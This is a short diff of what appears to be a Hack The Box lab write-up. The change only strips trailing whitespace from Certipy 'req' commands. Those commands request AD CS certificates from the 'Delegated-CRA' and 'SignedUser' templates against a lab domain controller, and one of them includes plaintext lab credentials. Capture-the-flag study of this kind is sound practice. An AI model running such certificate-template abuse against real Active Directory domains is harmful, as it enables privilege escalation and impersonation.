@@ -217,7 +217,7 @@ certipy req \
     -ca 'CERTIFICATE-DC01-CA' -template 'Delegated-CRA' -ns 10.10.11.71 
 
 
-certipy req \                                                                                                                                                                                  
+certipy req \
     -u 'lion.sk' -p '!QAZ2wsx' \
     -dc-ip '10.10.11.71' -target 'DC01.certificate.htb' \
     -ca 'Certificate-LTD-CA' -template 'SignedUser' \
